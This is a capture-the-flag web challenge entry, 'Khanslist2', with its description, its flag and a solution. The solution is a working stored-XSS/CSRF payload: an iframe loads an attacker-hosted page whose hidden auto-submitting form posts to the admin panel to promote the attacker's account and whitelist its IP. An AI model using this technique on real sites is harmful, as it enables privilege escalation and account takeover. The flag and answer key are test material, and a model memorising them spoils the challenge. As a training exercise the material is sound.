# RunCodeWeb

## Name: Khanslist2

### Category: Web

### Message:
```
Use/Create your account at <a target="_new" href="https://derp.runcode.ninja">Derp Runcode</a>.<br>
They upped their security a bit. But only a bit. Acquire ANOTHER admin account.
<br><br>
<a href="https://twitter.com/ohai_ninja" target="_blank">author: @ohai_ninja</a>
```

### Value: 30

### Max Attempts: 0

### Flag: 
```
derp{XSS_2_B_ADMIN_d3RpM13573R}
```

### Files:
[docker](xss-site-2)
### Solution:
```
Report to admin feature, regular admin does not have flag access. xss admin to edit your account to make you an admin and set safe_ip val appropriately:
<iframe src="http://10.0.16.2:8000/index.html"></iframe>
... ... then in served up index.html ... ...
<form name="xssform" action="http://127.0.0.1/admin.php?cat=users" method="post">
<input type="hidden" name="userid" value="2" />
<input type="hidden" name="email" value="bob@aol.com" />
<input type="hidden" name="admin" value="1" />
<input type="hidden" name="safe_ip" value="10.0.16.2" />
<input type="hidden" name="edit_user" />
</form>
<script>
document.xssform.submit();
</script>
```

